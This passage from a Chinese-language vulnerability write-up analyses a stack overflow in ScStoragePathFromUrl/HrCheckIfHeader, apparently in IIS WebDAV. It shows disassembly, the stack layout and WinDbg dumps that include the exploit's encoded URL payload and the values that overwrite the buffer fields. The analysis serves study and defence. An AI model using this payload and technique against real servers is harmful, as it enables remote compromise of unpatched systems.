<span class="mi">077</span><span class="n">f33a0</span>  <span class="mi">53</span> <span class="mi">39</span> <span class="mi">6</span><span class="n">c</span> <span class="mi">50</span> <span class="mi">67</span> <span class="mi">55</span> <span class="mi">63</span> <span class="mi">67</span><span class="o">-</span><span class="mi">64</span> <span class="mi">33</span> <span class="mi">30</span> <span class="mi">46</span> <span class="mi">45</span> <span class="mi">78</span> <span class="mi">52</span> <span class="mi">69</span>  <span class="n">S9lPgUcgd30FExRi</span>
<span class="mi">077</span><span class="n">f33b0</span>  <span class="mi">31</span> <span class="mi">54</span> <span class="mi">58</span> <span class="mi">4</span><span class="n">c</span> <span class="mi">51</span> <span class="mi">6</span><span class="n">a</span> <span class="mi">41</span> <span class="mi">72</span><span class="o">-</span><span class="mi">31</span> <span class="mi">42</span> <span class="mi">35</span> <span class="mi">70</span> <span class="mi">50</span> <span class="mi">58</span> <span class="mi">64</span> <span class="mi">36</span>  <span class="mi">1</span><span class="n">TXLQjAr1B5pPXd6</span>
<span class="mi">077</span><span class="n">f33c0</span>  <span class="mi">47</span> <span class="mi">6</span><span class="n">c</span> <span class="mi">39</span> <span class="mi">35</span> <span class="mi">6</span><span class="n">a</span> <span class="mi">54</span> <span class="mi">34</span> <span class="mi">50</span><span class="o">-</span><span class="mi">43</span> <span class="mi">54</span> <span class="mi">52</span> <span class="mi">77</span> <span class="mi">61</span> <span class="mi">50</span> <span class="mi">32</span> <span class="mi">32</span>  <span class="n">Gl95jT4PCTRwaP22</span>
</pre></div>


<h3>3.2 栈溢出</h3>
<p>根据前面的分析，可以知道当字符串超长时是可以导致堆溢出的，但问题是堆块的基地址并不是固定的。实际上，当 <code>CStackBuffer</code> 使用栈作为存储空间时，也可以触发栈溢出，原理和堆溢出是一样的。</p>
<p>当然，这里不是通过栈溢出来执行代码，因为栈上有 <code>cookie</code>。</p>
<div class="codehilite"><pre><span></span><span class="nl">.text:</span><span class="err">671255</span><span class="nf">F5</span>                 <span class="no">mov</span>     <span class="no">large</span> <span class="no">fs</span><span class="p">:</span><span class="mi">0</span><span class="p">,</span> <span class="no">ecx</span>
<span class="nl">.text:</span><span class="err">671255</span><span class="nf">FC</span>                 <span class="no">mov</span>     <span class="no">ecx</span><span class="p">,</span> <span class="p">[</span><span class="no">ebp</span><span class="err">+</span><span class="no">var_10</span><span class="p">]</span>
<span class="nl">.text:</span><span class="err">671255</span><span class="nf">FF</span>                 <span class="no">pop</span>     <span class="no">ebx</span>
<span class="nl">.text:</span><span class="err">67125600</span>                 <span class="nf">call</span>    <span class="err">@</span><span class="no">__security_check_cookie@4</span>
<span class="nl">.text:</span><span class="err">67125605</span>                 <span class="nf">leave</span>
<span class="nl">.text:</span><span class="err">67125606</span>                 <span class="nf">retn</span>    <span class="mi">8</span>
<span class="nl">.text:</span><span class="err">67125606</span> <span class="err">?</span><span class="nf">HrCheckIfHeader@@YGJPAVCMethUtil@@PBG@Z</span> <span class="no">endp</span>
</pre></div>


<p>在函数 <code>HrCheckIfHeader</code> 中存在两个 <code>CStackBuffer</code> 实例：</p>
<div class="codehilite"><pre><span></span>  <span class="kt">char</span> <span class="n">c_stack_buffer_1</span><span class="p">;</span>            <span class="c1">// [sp+44h] [bp-430h]@1</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v29</span><span class="p">;</span>                 <span class="c1">// [sp+148h] [bp-32Ch]@9</span>
  <span class="kt">wchar_t</span> <span class="o">*</span><span class="n">stack_buffer1</span><span class="p">;</span>           <span class="c1">// [sp+14Ch] [bp-328h]@9</span>
  <span class="kt">char</span> <span class="n">c_stack_buffer_2</span><span class="p">;</span>            <span class="c1">// [sp+150h] [bp-324h]@7</span>
  <span class="kt">unsigned</span> <span class="kr">__int16</span> <span class="o">*</span><span class="n">stack_buffer2</span><span class="p">;</span>  <span class="c1">// [sp+258h] [bp-21Ch]@8</span>
</pre></div>


<p>基于前面对 <code>CStackBuffer</code> 内存布局的分析，可以知道这里栈空间的分布为：</p>
<div class="codehilite"><pre><span></span>┌─────────────────────────┐
│            2.heap_buffer│  ebp-21C
├─────────────────────────┤
│         2.fake_heap_size│  ebp-220
├─────────────────────────┤
│CStackBuffer2.buffer[260]│  ebp-324
├─────────────────────────┤
│            1.heap_buffer│  ebp-328
├─────────────────────────┤
│         1.fake_heap_size│  ebp-32C
├─────────────────────────┤
│CStackBuffer1.buffer[260]│  ebp-430
└─────────────────────────┘
</pre></div>


<p>下面要重点分析的代码片段为：</p>
<div class="codehilite"><pre><span></span>res = pMethUtil-&gt;ScStoragePathFromUrl(
    buffer2.get(), buffer1.get(), &amp;length);     // (1)
if (res == 1)
{
    if (buffer1.resize(length))                 // (2)
    {
        res = pMethUtil-&gt;ScStoragePathFromUrl(  // (3)
            buffer2.get(), buffer1.get(), &amp;length);
    }
}
</pre></div>


<p><strong>(1)</strong> <code>HrCheckIfHeader</code> 第一次调用 <code>ScStoragePathFromUrl</code> 时传递的参数分析如下（函数返回值为 <code>1</code>，长度设置为 <code>0xaa</code>）：</p>
<div class="codehilite"><pre><span></span><span class="mi">0</span><span class="o">:</span><span class="mi">006</span><span class="o">&gt;</span> <span class="n">dds</span> <span class="n">esp</span> <span class="n">L3</span>
<span class="mi">03</span><span class="n">faf7b4</span>  <span class="mi">077</span><span class="n">d8eb0</span>      <span class="n">$$</span> <span class="n">http</span><span class="o">://</span><span class="n">localhost</span><span class="o">/</span><span class="n">aaaaaaa</span><span class="o">....</span>
<span class="mi">03</span><span class="n">faf7b8</span>  <span class="mi">03</span><span class="n">faf804</span>      <span class="n">$$</span> <span class="n">CStackBuffer1</span><span class="o">.</span><span class="na">buffer</span>
<span class="mi">03</span><span class="n">faf7bc</span>  <span class="mi">03</span><span class="n">faf800</span>      <span class="n">$$</span> <span class="mi">00000082</span>

<span class="mi">0</span><span class="o">:</span><span class="mi">006</span><span class="o">&gt;</span> <span class="n">dd</span> <span class="mi">03</span><span class="n">faf800</span> <span class="n">L1</span>
<span class="mi">03</span><span class="n">faf800</span>  

<span class="mi">0</span><span class="o">:</span><span class="mi">006</span><span class="o">&gt;</span> <span class="n">db</span> <span class="mi">077</span><span class="n">d8eb0</span>
<span class="mi">077</span><span class="n">d8eb0</span>  <span class="mi">68</span> <span class="mi">00</span> <span class="mi">74</span> <span class="mi">00</span> <span class="mi">74</span> <span class="mi">00</span> <span class="mi">70</span> <span class="mi">00</span><span class="o">-</span><span class="mi">3</span><span class="n">a</span> <span class="mi">00</span> <span class="mi">2</span><span class="n">f</span> <span class="mi">00</span> <span class="mi">2</span><span class="n">f</span> <span class="mi">00</span> <span class="mi">6</span><span class="n">c</span> <span class="mi">00</span>  <span class="n">h</span><span class="o">.</span><span class="na">t</span><span class="o">.</span><span class="na">t</span><span class="o">.</span><span class="na">p</span><span class="o">.:././.</span><span class="n">l</span><span class="o">.</span>
<span class="mi">077</span><span class="n">d8ec0</span>  <span class="mi">6</span><span class="n">f</span> <span class="mi">00</span> <span class="mi">63</span> <span class="mi">00</span> <span class="mi">61</span> <span class="mi">00</span> <span class="mi">6</span><span class="n">c</span> <span class="mi">00</span><span class="o">-</span><span class="mi">68</span> <span class="mi">00</span> <span class="mi">6</span><span class="n">f</span> <span class="mi">00</span> <span class="mi">73</span> <span class="mi">00</span> <span class="mi">74</span> <span class="mi">00</span>  <span class="n">o</span><span class="o">.</span><span class="na">c</span><span class="o">.</span><span class="na">a</span><span class="o">.</span><span class="na">l</span><span class="o">.</span><span class="na">h</span><span class="o">.</span><span class="na">o</span><span class="o">.</span><span class="na">s</span><span class="o">.</span><span class="na">t</span><span class="o">.</span>
<span class="mi">077</span><span class="n">d8ed0</span>  <span class="mi">2</span><span class="n">f</span> <span class="mi">00</span> <span class="mi">61</span> <span class="mi">00</span> <span class="mi">61</span> <span class="mi">00</span> <span class="mi">61</span> <span class="mi">00</span><span class="o">-</span><span class="mi">61</span> <span class="mi">00</span> <span class="mi">61</span> <span class="mi">00</span> <span class="mi">61</span> <span class="mi">00</span> <span class="mi">61</span> <span class="mi">00</span>  <span class="o">/.</span><span class="n">a</span><span class="o">.</span><span class="na">a</span><span class="o">.</span><span class="na">a</span><span class="o">.</span><span class="na">a</span><span class="o">.</span><span class="na">a</span><span class="o">.</span><span class="na">a</span><span class="o">.</span><span class="na">a</span><span class="o">.</span>
<span class="mi">077</span><span class="n">d8ee0</span>  <span class="mi">68</span> <span class="mi">6</span><span class="n">f</span> <span class="mi">63</span> <span class="mi">78</span> <span class="mi">61</span> <span class="mi">77</span> <span class="mi">33</span> <span class="mi">71</span><span class="o">-</span><span class="mi">36</span> <span class="mi">69</span> <span class="mi">72</span> <span class="mi">47</span> <span class="mi">39</span> <span class="mi">7</span><span class="n">a</span> <span class="mi">77</span> <span class="mi">4</span><span class="n">b</span>  <span class="n">hocxaw3q6irG9zwK</span>
<span class="mi">077</span><span class="n">d8ef0</span>  <span class="mi">70</span> <span class="mi">4</span><span class="n">f</span> <span class="mi">53</span> <span class="mi">75</span> <span class="mi">4</span><span class="n">f</span> <span class="mi">7</span><span class="n">a</span> <span class="mi">68</span> <span class="mi">48</span><span class="o">-</span><span class="mi">63</span> <span class="mi">56</span> <span class="mi">54</span> <span class="mi">6</span><span class="n">d</span> <span class="mi">45</span> <span class="mi">68</span> <span class="mi">53</span> <span class="mi">39</span>  <span class="n">pOSuOzhHcVTmEhS9</span>
<span class="mi">077</span><span class="n">d8f00</span>  <span class="mi">6</span><span class="n">c</span> <span class="mi">50</span> <span class="mi">67</span> <span class="mi">55</span> <span class="mi">63</span> <span class="mi">67</span> <span class="mi">64</span> <span class="mi">33</span><span class="o">-</span><span class="mi">30</span> <span class="mi">46</span> <span class="mi">45</span> <span class="mi">78</span> <span class="mi">52</span> <span class="mi">69</span> <span class="mi">31</span> <span class="mi">54</span>  <span class="n">lPgUcgd30FExRi1T</span>
<span class="mi">077</span><span class="n">d8f10</span>  <span class="mi">58</span> <span class="mi">4</span><span class="n">c</span> <span class="mi">51</span> <span class="mi">6</span><span class="n">a</span> <span class="mi">41</span> <span class="mi">72</span> <span class="mi">31</span> <span class="mi">42</span><span class="o">-</span><span class="mi">35</span> <span class="mi">70</span> <span class="mi">50</span> <span class="mi">58</span> <span class="mi">64</span> <span class="mi">36</span> <span class="mi">47</span> <span class="mi">6</span><span class="n">c</span>  <span class="n">XLQjAr1B5pPXd6Gl</span>
<span class="mi">077</span><span class="n">d8f20</span>  <span class="mi">39</span> <span class="mi">35</span> <span class="mi">6</span><span class="n">a</span> <span class="mi">54</span> <span class="mi">34</span> <span class="mi">50</span> <span class="mi">43</span> <span class="mi">54</span><span class="o">-</span><span class="mi">52</span> <span class="mi">77</span> <span class="mi">61</span> <span class="mi">50</span> <span class="mi">32</span> <span class="mi">32</span> <span class="mi">4</span><span class="n">b</span> <span class="mi">6</span><span class="n">d</span>  <span class="mi">95</span><span class="n">jT4PCTRwaP22Km</span>
<span class="mi">077</span><span class="n">d8f30</span>  <span class="mi">34</span> <span class="mi">6</span><span class="n">c</span> <span class="mi">47</span> <span class="mi">32</span> <span class="mi">41</span> <span class="mi">62</span> <span class="mi">4</span><span class="n">d</span> <span class="mi">37</span><span class="o">-</span><span class="mi">61</span> <span class="mi">51</span> <span class="mi">62</span> <span class="mi">58</span> <span class="mi">73</span> <span class="mi">47</span> <span class="mi">50</span> <span class="mi">52</span>  <span class="mi">4</span><span class="n">lG2AbM7aQbXsGPR</span>
<span class="mi">077</span><span class="n">d8f40</span>  <span class="mi">70</span> <span class="mi">36</span> <span class="mi">44</span> <span class="mi">75</span> <span class="mi">6</span><span class="n">a</span> <span class="mi">68</span> <span class="mi">74</span> <span class="mi">33</span><span class="o">-</span><span class="mi">4</span><span class="n">a</span> <span class="mi">4</span><span class="n">e</span> <span class="mi">6</span><span class="n">b</span> <span class="mi">78</span> <span class="mi">76</span> <span class="mi">49</span> <span class="mi">73</span> <span class="mi">4</span><span class="n">e</span>  <span class="n">p6Dujht3JNkxvIsN</span>
<span class="mi">077</span><span class="n">d8f50</span>  <span class="mi">6</span><span class="n">a</span> <span class="mi">4</span><span class="n">c</span> <span class="mi">7</span><span class="n">a</span> <span class="mi">57</span> <span class="mi">71</span> <span class="mi">6</span><span class="n">f</span> <span class="mi">4</span><span class="n">a</span> <span class="mi">58</span><span class="o">-</span><span class="mi">30</span> <span class="mi">32</span> <span class="mi">6</span><span class="n">e</span> <span class="mi">37</span> <span class="mi">49</span> <span class="mi">4</span><span class="n">b</span> <span class="mi">4</span><span class="n">d</span> <span class="mi">52</span>  <span class="n">jLzWqoJX02n7IKMR</span>
<span class="mi">077</span><span class="n">d8f60</span>  <span class="mi">63</span> <span class="mi">48</span> <span class="mi">4</span><span class="n">c</span> <span class="mi">6</span><span class="n">f</span> <span class="mi">56</span> <span class="mi">75</span> <span class="mi">75</span> <span class="mi">75</span><span class="o">-</span><span class="mi">6</span><span class="n">f</span> <span class="mi">66</span> <span class="mi">68</span> <span class="mi">76</span> <span class="mi">4</span><span class="n">d</span> <span class="mi">44</span> <span class="mi">70</span> <span class="mi">50</span>  <span class="n">cHLoVuuuofhvMDpP</span>
<span class="mi">077</span><span class="n">d8f70</span>  <span class="mi">36</span> <span class="mi">7</span><span class="n">a</span> <span class="mi">4</span><span class="n">b</span> <span class="mi">62</span> <span class="mi">57</span> <span class="mi">65</span> <span class="mi">50</span> <span class="mi">75</span><span class="o">-</span><span class="mi">72</span> <span class="mi">6</span><span class="n">a</span> <span class="mi">6</span><span class="n">b</span> <span class="mi">7</span><span class="n">a</span> <span class="mi">62</span> <span class="mi">77</span> <span class="mi">58</span> <span class="mi">76</span>  <span class="mi">6</span><span class="n">zKbWePurjkzbwXv</span>
<span class="mi">077</span><span class="n">d8f80</span>  <span class="mi">48</span> <span class="mi">62</span> <span class="mi">31</span> <span class="mi">65</span> <span class="mi">54</span> <span class="mi">30</span> <span class="mi">79</span> <span class="mi">6</span><span class="n">c</span><span class="o">-</span><span class="mi">4</span><span class="n">a</span> <span class="mi">50</span> <span class="mi">62</span> <span class="mi">54</span> <span class="mi">33</span> <span class="mi">50</span> <span class="mi">77</span> <span class="mi">35</span>  <span class="n">Hb1eT0ylJPbT3Pw5</span>
<span class="mi">077</span><span class="n">d8f90</span>  <span class="mi">77</span> <span class="mi">6</span><span class="n">a</span> <span class="mi">44</span> <span class="mi">41</span> <span class="mi">34</span> <span class="mi">33</span> <span class="mi">76</span> <span class="mi">64</span><span class="o">-</span><span class="mi">46</span> <span class="mi">4</span><span class="n">d</span> <span class="mi">54</span> <span class="mi">56</span> <span class="mi">6</span><span class="n">c</span> <span class="mi">47</span> <span class="mi">43</span> <span class="mi">65</span>  <span class="n">wjDA43vdFMTVlGCe</span>
<span class="mi">077</span><span class="n">d8fa0</span>  <span class="mi">32</span> <span class="mi">76</span> <span class="mi">78</span> <span class="mi">72</span> <span class="mi">69</span> <span class="mi">57</span> <span class="mi">38</span> <span class="mi">43</span><span class="o">-</span><span class="mi">72</span> <span class="mi">62</span> <span class="mi">30</span> <span class="mi">5</span><span class="n">a</span> <span class="mi">38</span> <span class="mi">59</span> <span class="mi">48</span> <span class="mi">54</span>  <span class="mi">2</span><span class="n">vxriW8Crb0Z8YHT</span>
<span class="mi">077</span><span class="n">d8fb0</span>  <span class="mi">02</span> <span class="mi">02</span> <span class="mi">02</span> <span class="mi">02</span> <span class="n">c0</span> <span class="mi">12</span> <span class="mi">03</span> <span class="mi">68</span><span class="o">-</span><span class="mi">44</span> <span class="mi">6</span><span class="n">c</span> <span class="mi">56</span> <span class="mi">52</span> <span class="mi">37</span> <span class="mi">4</span><span class="n">b</span> <span class="mi">6</span><span class="n">d</span> <span class="mi">6</span><span class="n">c</span>  <span class="o">.......</span><span class="n">hDlVR7Kml</span>
<span class="mi">077</span><span class="n">d8fc0</span>  <span class="mi">58</span> <span class="mi">4</span><span class="n">f</span> <span class="mi">5</span><span class="n">a</span> <span class="mi">58</span> <span class="mi">50</span> <span class="mi">79</span> <span class="mi">6</span><span class="n">a</span> <span class="mi">49</span><span class="o">-</span><span class="mi">4</span><span class="n">f</span> <span class="mi">58</span> <span class="mi">52</span> <span class="mi">4</span><span class="n">a</span> <span class="mi">50</span> <span class="mi">41</span> <span class="mi">4</span><span class="n">d</span> <span class="mi">66</span>  <span class="n">XOZXPyjIOXRJPAMf</span>
<span class="mi">077</span><span class="n">d8fd0</span>  <span class="n">c0</span> <span class="mi">13</span> <span class="mi">03</span> <span class="mi">68</span> <span class="mi">34</span> <span class="mi">48</span> <span class="mi">31</span> <span class="mi">65</span><span class="o">-</span><span class="mi">43</span> <span class="mi">6</span><span class="n">f</span> <span class="mi">66</span> <span class="mi">6</span><span class="n">e</span> <span class="mi">41</span> <span class="mi">74</span> <span class="mi">6</span><span class="n">c</span> <span class="mi">43</span>  <span class="o">...</span><span class="n">h4H1eCofnAtlC</span>
<span class="mi">077</span><span class="n">d8fe0</span>  <span class="n">c0</span> <span class="mi">13</span> <span class="mi">03</span> <span class="mi">68</span> <span class="mi">43</span> <span class="mi">53</span> <span class="mi">41</span> <span class="mi">6</span><span class="n">a</span><span class="o">-</span><span class="mi">52</span> <span class="mi">70</span> <span class="mi">30</span> <span class="mi">33</span> <span class="mi">66</span> <span class="mi">58</span> <span class="mi">4</span><span class="n">c</span> <span class="mi">42</span>  <span class="o">...</span><span class="n">hCSAjRp03fXLB</span>
<span class="mi">077</span><span class="n">d8ff0</span>  <span class="mi">4</span><span class="n">b</span> <span class="mi">70</span> <span class="mi">46</span> <span class="mi">63</span> <span class="mi">73</span> <span class="mi">51</span> <span class="mi">41</span> <span class="mi">79</span><span class="o">-</span><span class="mi">50</span> <span class="mi">7</span><span class="n">a</span> <span class="mi">6</span><span class="n">c</span> <span class="mi">4</span><span class="n">a</span> <span class="mi">3</span><span class="n">e</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>  <span class="n">KpFcsQAyPzlJ</span><span class="o">&gt;...</span>
<span class="mi">077</span><span class="n">d9000</span>  <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??-??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span>  <span class="o">????????????????</span>
</pre></div>


<p><strong>(2)</strong> 因为 <code>ScStoragePathFromUrl</code> 返回 <code>0xaa</code>，所以 <code>buffer1.resize(0xaa)</code> 并不会在堆上分配空间，而是直接使用栈上的 <code>buffer</code>。</p>
<p><strong>(3)</strong> 第二次调用 <code>ScStoragePathFromUrl</code> 时会导致栈溢出，实际结果是 <code>CStackBuffer1.fake_heap_size</code> 被改写为 <code>0x02020202</code>、<code>CStackBuffer1.heap_buffer</code> 被改写为 <code>0x680312c0</code>。</p>
<div class="codehilite"><pre><span></span><span class="mi">0</span><span class="o">:</span><span class="mi">006</span><span class="o">&gt;</span> <span class="n">dds</span> <span class="n">esp</span> <span class="n">L3</span>
<span class="mi">03</span><span class="n">faf7b4</span>  <span class="mi">077</span><span class="n">d8eb0</span>      <span class="n">$$</span> <span class="n">http</span><span class="o">://</span><span class="n">localhost</span><span class="o">/</span><span class="n">aaaaaaa</span><span class="o">....</span>
<span class="mi">03</span><span class="n">faf7b8</span>  <span class="mi">03</span><span class="n">faf804</span>      <span class="n">$$</span> <span class="n">CStackBuffer1</span><span class="o">.</span><span class="na">buffer</span>
<span class="mi">03</span><span class="n">faf7bc</span>  <span class="mi">03</span><span class="n">faf800</span>      <span class="n">$$</span> <span class="mi">00000412</span> <span class="o">=</span> <span class="o">((</span><span class="mh">0x104</span> <span class="o">*</span> <span class="mi">4</span><span class="o">)</span> <span class="o">|</span> <span class="o">(</span><span class="mh">0x82</span> <span class="o">&amp;</span> <span class="mi">3</span><span class="o">))</span> <span class="o">|</span> <span class="mi">2</span>

<span class="n">$$</span> <span class="err">留意最后面</span> <span class="mi">2</span> <span class="err">个</span> <span class="n">DWORD</span> <span class="err">的值</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">006</span><span class="o">&gt;</span> <span class="n">db</span> <span class="n">ebp</span><span class="o">-</span><span class="mi">430</span> <span class="n">L10C</span>
<span class="mi">03</span><span class="n">faf804</span>  <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span><span class="o">-</span><span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>  <span class="o">................</span>
<span class="mi">03</span><span class="n">faf814</span>  <span class="n">c0</span> <span class="mi">59</span> <span class="mi">55</span> <span class="mi">03</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span><span class="o">-</span><span class="mi">00</span> <span class="mi">10</span> <span class="mi">08</span> <span class="mi">00</span> <span class="mi">60</span> <span class="n">f8</span> <span class="n">fa</span> <span class="mi">03</span>  <span class="o">.</span><span class="na">YU</span><span class="o">.........</span><span class="err">`</span><span class="o">...</span>
<span class="mi">03</span><span class="n">faf824</span>  <span class="n">fc</span> <span class="n">f7</span> <span class="n">fa</span> <span class="mi">03</span> <span class="n">f8</span> <span class="mi">64</span> <span class="mi">02</span> <span class="mi">07</span><span class="o">-</span><span class="mi">94</span> <span class="n">f8</span> <span class="n">fa</span> <span class="mi">03</span> <span class="mi">70</span> <span class="mi">82</span> <span class="mi">82</span> <span class="mi">7</span><span class="n">c</span>  <span class="o">.....</span><span class="n">d</span><span class="o">......</span><span class="n">p</span><span class="o">..|</span>
<span class="mi">03</span><span class="n">faf834</span>  <span class="n">a0</span> <span class="mi">6</span><span class="n">e</span> <span class="mi">87</span> <span class="mi">7</span><span class="n">c</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span><span class="o">-</span><span class="mi">9</span><span class="n">c</span> <span class="mi">6</span><span class="n">e</span> <span class="mi">87</span> <span class="mi">7</span><span class="n">c</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>  <span class="o">.</span><span class="na">n</span><span class="o">.|.....</span><span class="n">n</span><span class="o">.|....</span>
<span class="mi">03</span><span class="n">faf844</span>  <span class="mi">01</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">16</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span><span class="o">-</span><span class="mi">23</span> <span class="mi">9</span><span class="n">f</span> <span class="mi">87</span> <span class="mi">7</span><span class="n">c</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>  <span class="o">........</span><span class="err">#</span><span class="o">..|....</span>
<span class="mi">03</span><span class="n">faf854</span>  <span class="n">c4</span> <span class="n">af</span> <span class="mi">7</span><span class="n">b</span> <span class="mi">04</span> <span class="mi">02</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">01</span><span class="o">-</span><span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">04</span> <span class="mi">5</span><span class="n">d</span> <span class="mi">88</span> <span class="mi">8</span><span class="n">a</span>  <span class="o">..{..........]..</span>
<span class="mi">03</span><span class="n">faf864</span>  <span class="mi">6</span><span class="n">c</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">8</span><span class="n">c</span> <span class="mi">1</span><span class="n">e</span> <span class="mi">8</span><span class="n">f</span> <span class="mi">60</span><span class="o">-</span><span class="mi">82</span> <span class="mi">1</span><span class="n">e</span> <span class="mi">8</span><span class="n">f</span> <span class="mi">60</span> <span class="mi">02</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>  <span class="n">l</span><span class="o">......</span><span class="err">`</span><span class="o">...</span><span class="err">`</span><span class="o">....</span>
<span class="mi">03</span><span class="n">faf874</span>  <span class="mi">9</span><span class="n">a</span> <span class="mi">1</span><span class="n">e</span> <span class="mi">8</span><span class="n">f</span> <span class="mi">60</span> <span class="mi">34</span> <span class="n">fb</span> <span class="n">fa</span> <span class="mi">03</span><span class="o">-</span><span class="mi">33</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>  <span class="o">...</span><span class="err">`</span><span class="mi">4</span><span class="o">...</span><span class="mi">3</span><span class="o">.......</span>
<span class="mi">03</span><span class="n">faf884</span>  <span class="mi">8</span><span class="n">c</span> <span class="mi">1</span><span class="n">e</span> <span class="mi">8</span><span class="n">f</span> <span class="mi">60</span> <span class="mi">52</span> <span class="mi">23</span> <span class="mi">8</span><span class="n">f</span> <span class="mi">60</span><span class="o">-</span><span class="mi">22</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>  <span class="o">...</span><span class="err">`</span><span class="n">R</span><span class="err">#</span><span class="o">.</span><span class="err">`&quot;</span><span class="o">.......</span>
<span class="mi">03</span><span class="n">faf894</span>  <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span><span class="o">-</span><span class="mi">01</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">0</span><span class="n">c</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>  <span class="o">................</span>
<span class="mi">03</span><span class="n">faf8a4</span>  <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span><span class="o">-</span><span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>  <span class="o">................</span>
<span class="mi">03</span><span class="n">faf8b4</span>  <span class="n">f6</span> <span class="mi">67</span> <span class="n">ca</span> <span class="mi">77</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span><span class="o">-</span><span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>  <span class="o">.</span><span class="na">g</span><span class="o">.</span><span class="na">w</span><span class="o">............</span>
<span class="mi">03</span><span class="n">faf8c4</span>  <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span><span class="o">-</span><span class="mi">20</span> <span class="n">f9</span> <span class="n">fa</span> <span class="mi">03</span> <span class="mi">4</span><span class="n">a</span> <span class="n">b0</span> <span class="n">bc</span> <span class="mi">77</span>  <span class="o">........</span> <span class="o">...</span><span class="n">J</span><span class="o">..</span><span class="n">w</span>
<span class="mi">03</span><span class="n">faf8d4</span>  <span class="mi">85</span> <span class="mi">05</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">4</span><span class="n">f</span> <span class="n">f9</span> <span class="n">fa</span> <span class="mi">03</span><span class="o">-</span><span class="mi">5</span><span class="n">b</span> <span class="mi">20</span> <span class="mi">11</span> <span class="mi">67</span> <span class="mi">5</span><span class="n">c</span> <span class="n">b0</span> <span class="n">bc</span> <span class="mi">77</span>  <span class="o">....</span><span class="n">O</span><span class="o">...[</span> <span class="o">.</span><span class="na">g</span><span class="o">\..</span><span class="n">w</span>
<span class="mi">03</span><span class="n">faf8e4</span>  <span class="mi">5</span><span class="n">b</span> <span class="mi">20</span> <span class="mi">11</span> <span class="mi">67</span> <span class="n">b0</span> <span class="mi">72</span> <span class="n">bd</span> <span class="mi">77</span><span class="o">-</span><span class="mi">4</span><span class="n">f</span> <span class="n">f9</span> <span class="n">fa</span> <span class="mi">03</span> <span class="mi">5</span><span class="n">b</span> <span class="mi">20</span> <span class="mi">11</span> <span class="mi">67</span>  <span class="o">[</span> <span class="o">.</span><span class="na">g</span><span class="o">.</span><span class="na">r</span><span class="o">.</span><span class="na">wO</span><span class="o">...[</span> <span class="o">.</span><span class="na">g</span>
<span class="mi">03</span><span class="n">faf8f4</span>  <span class="mi">13</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">58</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span><span class="o">-</span><span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="n">e8</span> <span class="mi">64</span> <span class="mi">02</span> <span class="mi">07</span>  <span class="o">....</span><span class="n">X</span><span class="o">........</span><span class="n">d</span><span class="o">..</span>
<span class="mi">03</span><span class="n">faf904</span>  <span class="n">c0</span> <span class="mi">17</span> <span class="n">bf</span> <span class="mi">77</span> <span class="mi">12</span> <span class="mi">04</span> <span class="mi">00</span> <span class="mi">00</span><span class="o">-</span><span class="mi">04</span> <span class="n">f8</span> <span class="n">fa</span> <span class="mi">03</span>              <span class="o">...</span><span class="n">w</span><span class="o">........</span>
                      <span class="o">^^^^^^^^^^^</span> <span class="o">~~~~~~~~~~~</span>

<span class="mi">0</span><span class="o">:</span><span class="mi">006</span><span class="o">&gt;</span> <span class="n">p</span>
